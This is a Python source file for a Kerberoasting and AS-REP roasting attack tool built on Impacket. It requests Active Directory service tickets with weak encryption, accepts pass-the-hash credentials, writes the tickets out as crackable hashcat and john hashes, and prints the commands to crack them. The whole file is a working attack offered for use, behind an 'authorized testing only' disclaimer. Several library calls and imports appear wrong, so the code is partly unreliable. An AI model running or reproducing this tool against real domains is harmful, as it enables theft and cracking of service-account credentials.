#!/usr/bin/env python3
"""
Kerberoasting Attack Tool - Service Account Hash Extraction
For authorized security testing only
"""
import sys
import json
import time
import hashlib
import binascii
from datetime import datetime
from collections import defaultdict

try:
    from impacket.krb5 import constants
    from impacket.krb5.types import Principal
    from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
    from impacket.krb5.kerberosv5 import ASREQroast, TGSREQroast
    from impacket.krb5.asn1 import AS_REQ, AS_REP, TGS_REQ, TGS_REP
    from impacket.krb5.crypto import Key, _enctype_table
    IMPACKET_AVAILABLE = True
except ImportError:
    IMPACKET_AVAILABLE = False
    print("[!] Impacket required: pip install impacket")

class Kerberoaster:
    def __init__(self, domain, username='', password='', hashes=None, dc_ip=None):
        self.domain = domain.upper()
        self.username = username
        self.password = password
        self.hashes = hashes  # LM:NT format
        self.dc_ip = dc_ip
        self.kdc_host = None
        
        self.results = {
            'service_accounts': [],
            'extracted_tickets': [],
            'crackable_hashes': [],
            'errors': []
        }
        
        # Common SPNs to search for
        self.target_spns = [
            'MSSQLSvc', 'HTTP', 'TERMSRV', 'WSMAN',
            'SMTP', 'POP3', 'IMAP', 'Exchange',
            'cifs', 'host', 'ldap', 'krbtgt',
            'FIMService', 'MSServerCluster', 'MSOLAPSvc',
            'ReportServer', 'SMTPSvc', 'VPN', 'www'
        ]
        
        # Weak encryption types to target
        self.weak_etypes = [
            constants.EncryptionTypes.rc4_hmac.value,      # RC4-HMAC (weak)
            constants.EncryptionTypes.des_cbc_crc.value,   # DES (very weak)
            constants.EncryptionTypes.des_cbc_md5.value,   # DES-MD5 (very weak)
        ]

    def get_tgt(self):
        """Get Ticket Granting Ticket"""
        print("[*] Getting TGT...")
        
        try:
            if self.hashes:
                lm_hash, nt_hash = self.hashes.split(':')
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                    Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value),
                    self.password,
                    self.domain,
                    lm_hash=bytes.fromhex(lm_hash) if lm_hash != 'aad3b435b51404eeaad3b435b51404ee' else '',
                    nt_hash=bytes.fromhex(nt_hash),
                    kdcHost=self.dc_ip
                )
            else:
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                    Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value),
                    self.password,
                    self.domain,
                    kdcHost=self.dc_ip
                )
            
            print(f"[+] TGT obtained for {self.username}@{self.domain}")
            
            return tgt, cipher, oldSessionKey, sessionKey
            
        except Exception as e:
            print(f"[-] TGT error: {e}")
            self.results['errors'].append({
                'stage': 'TGT',
                'error': str(e)
            })
            return None, None, None, None

    def find_service_accounts(self, tgt, cipher, sessionKey):
        """Find service accounts with SPNs"""
        print("[*] Finding service accounts...")
        
        service_accounts = []
        
        try:
            # Request TGS for each SPN type
            for spn_type in self.target_spns:
                try:
                    spn = f'{spn_type}/{self.domain.lower()}'
                    servicePrincipal = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
                    
                    tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
                        servicePrincipal,
                        self.domain,
                        self.kdc_host or self.dc_ip,
                        tgt,
                        cipher,
                        sessionKey
                    )
                    
                    service_accounts.append({
                        'spn': spn,
                        'tgs': tgs,
                        'cipher': cipher,
                        'sessionKey': sessionKey
                    })
                    
                except Exception as e:
                    if 'KDC_ERR_S_PRINCIPAL_UNKNOWN' not in str(e):
                        self.results['errors'].append({
                            'spn_type': spn_type,
                            'error': str(e)
                        })
            
            print(f"    Found {len(service_accounts)} service accounts")
            
        except Exception as e:
            print(f"[-] Service account enumeration error: {e}")
        
        self.results['service_accounts'] = service_accounts
        return service_accounts

    def request_service_tickets(self, tgt, cipher, sessionKey):
        """Request service tickets for kerberoasting"""
        print("[*] Requesting service tickets...")
        
        extracted_tickets = []
        
        # Request TGS for each known service
        for spn_type in self.target_spns:
            for host in ['', self.domain.lower()]:
                try:
                    spn = f'{spn_type}/{host}' if host else f'{spn_type}'
                    servicePrincipal = Principal(
                        spn,
                        type=constants.PrincipalNameType.NT_SRV_INST.value
                    )
                    
                    # Request with weak encryption types
                    for etype in self.weak_etypes:
                        try:
                            tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
                                servicePrincipal,
                                self.domain,
                                self.kdc_host or self.dc_ip,
                                tgt,
                                cipher,
                                sessionKey,
                                etype
                            )
                            
                            # Extract hash for cracking
                            hash_data = self.extract_hash(tgs, etype)
                            
                            if hash_data:
                                extracted_tickets.append({
                                    'spn': spn,
                                    'encryption': etype,
                                    'hash': hash_data,
                                    'tgs': tgs
                                })
                                
                                print(f"    [+] {spn} ({_enctype_table[etype]})")
                            
                        except Exception as e:
                            if 'KDC_ERR_ETYPE_NOSUPP' not in str(e):
                                continue
                
                except Exception as e:
                    continue
        
        print(f"    Extracted {len(extracted_tickets)} tickets")
        
        self.results['extracted_tickets'] = extracted_tickets
        return extracted_tickets

    def extract_hash(self, tgs, etype):
        """Extract crackable hash from TGS"""
        try:
            # Parse TGS-REP
            tgs_rep = TGS_REP(tgs)
            
            # Get encrypted part
            cipher = tgs_rep['ticket']['enc-part']['cipher']
            
            # Format for hashcat/john
            if etype == constants.EncryptionTypes.rc4_hmac.value:
                # RC4 format: $krb5tgs$23$*user$realm$spn$first_16_bytes$rest
                hash_str = f"$krb5tgs$23$*{self.username}${self.domain}$*$"
                hash_str += binascii.hexlify(cipher[:16]).decode()
                hash_str += "$" + binascii.hexlify(cipher[16:]).decode()
                
                return hash_str
            
            elif etype == constants.EncryptionTypes.des_cbc_crc.value:
                # DES format
                hash_str = f"$krb5tgs$8$*{self.username}${self.domain}$*$"
                hash_str += binascii.hexlify(cipher).decode()
                
                return hash_str
            
            else:
                # Generic format
                return binascii.hexlify(cipher).decode()
        
        except Exception as e:
            print(f"    [-] Hash extraction error: {e}")
            return None

    def roast_without_auth(self):
        """Kerberoast without authentication (AS-REP roasting)"""
        print("[*] Attempting AS-REP roasting...")
        
        roasted_hashes = []
        
        try:
            # Users with "Do not require Kerberos preauthentication"
            userPrincipal = Principal(
                self.username,
                type=constants.PrincipalNameType.NT_PRINCIPAL.value
            )
            
            asReq = ASREQroast(userPrincipal, self.domain, self.kdc_host or self.dc_ip)
            
            if asReq:
                print(f"    [+] AS-REP roastable account found!")
                
                # Extract hash
                asRep = AS_REP(asReq)
                cipher = asRep['enc-part']['cipher']
                
                # Format for hashcat
                hash_str = f"$krb5asrep$23${self.username}@{self.domain}:"
                hash_str += binascii.hexlify(cipher[:16]).decode()
                hash_str += "$" + binascii.hexlify(cipher[16:]).decode()
                
                roasted_hashes.append({
                    'username': self.username,
                    'domain': self.domain,
                    'hash': hash_str,
                    'type': 'asrep'
                })
                
                self.results['crackable_hashes'].append({
                    'type': 'asrep',
                    'username': self.username,
                    'hash': hash_str
                })
        
        except Exception as e:
            print(f"    [-] AS-REP error: {e}")
        
        return roasted_hashes

    def save_hashes_for_cracking(self):
        """Save extracted hashes for cracking tools"""
        print("[*] Saving hashes for cracking...")
        
        # Save in hashcat format
        with open('kerberoast_hashes.hashcat', 'w') as f:
            for ticket in self.results['extracted_tickets']:
                if 'hash' in ticket:
                    f.write(f"{ticket['hash']}\n")
        
        # Save in john format
        with open('kerberoast_hashes.john', 'w') as f:
            for ticket in self.results['extracted_tickets']:
                if 'hash' in ticket:
                    f.write(f"{ticket['hash']}\n")
        
        # Save AS-REP hashes
        for hash_info in self.results['crackable_hashes']:
            if hash_info['type'] == 'asrep':
                with open('asrep_hashes.hashcat', 'w') as f:
                    f.write(f"{hash_info['hash']}\n")
        
        print("[+] Hash files saved:")
        print("    - kerberoast_hashes.hashcat (hashcat format)")
        print("    - kerberoast_hashes.john (John format)")
        print("    - asrep_hashes.hashcat (AS-REP hashes)")
        
        # Print cracking commands
        print("\n[*] Cracking commands:")
        print("    hashcat -m 13100 kerberoast_hashes.hashcat wordlist.txt")
        print("    hashcat -m 18200 asrep_hashes.hashcat wordlist.txt")
        print("    john --format=krb5tgs kerberoast_hashes.john --wordlist=wordlist.txt")

    def generate_report(self):
        """Generate kerberoasting report"""
        report = {
            'timestamp': datetime.now().isoformat(),
            'domain': self.domain,
            'username': self.username,
            'service_accounts': len(self.results['service_accounts']),
            'extracted_tickets': len(self.results['extracted_tickets']),
            'asrep_roastable': len([h for h in self.results['crackable_hashes'] if h['type'] == 'asrep']),
            'tickets': self.results['extracted_tickets'],
            'errors': self.results['errors']
        }
        
        with open('kerberoasting_report.json', 'w') as f:
            json.dump(report, f, indent=2, default=str)
        
        print(f"\n[+] Report saved to kerberoasting_report.json")
        return report

    def execute(self):
        """Execute kerberoasting attack"""
        print(f"[*] Starting Kerberoasting Attack")
        print(f"[*] Domain: {self.domain}")
        print(f"[*] User: {self.username}")
        print()
        
        if not IMPACKET_AVAILABLE:
            print("[-] Impacket required!")
            return None
        
        # Get TGT
        tgt, cipher, oldSessionKey, sessionKey = self.get_tgt()
        
        if not tgt:
            # Try AS-REP roasting
            self.roast_without_auth()
        else:
            # Request service tickets
            self.request_service_tickets(tgt, cipher, sessionKey)
        
        # Save hashes
        self.save_hashes_for_cracking()
        
        # Generate report
        return self.generate_report()

def main():
    if len(sys.argv) < 4:
        print("Usage: python kerberoasting.py <domain> <username> [password] [--hashes LM:NT]")
        print("\nExamples:")
        print("  python kerberoasting.py domain.local user password123")
        print("  python kerberoasting.py domain.local user --hashes aad3b435b51404eeaad3b435b51404ee:ntlm_hash")
        sys.exit(1)
    
    domain = sys.argv[1]
    username = sys.argv[2]
    password = None
    hashes = None
    
    if len(sys.argv) > 3:
        if sys.argv[3] == '--hashes':
            hashes = sys.argv[4] if len(sys.argv) > 4 else None
        else:
            password = sys.argv[3]
    
    print("[!] WARNING: Only use on systems you own or have explicit permission to test!\n")
    
    roaster = Kerberoaster(domain, username, password, hashes)
    roaster.execute()

if __name__ == "__main__":
    main()
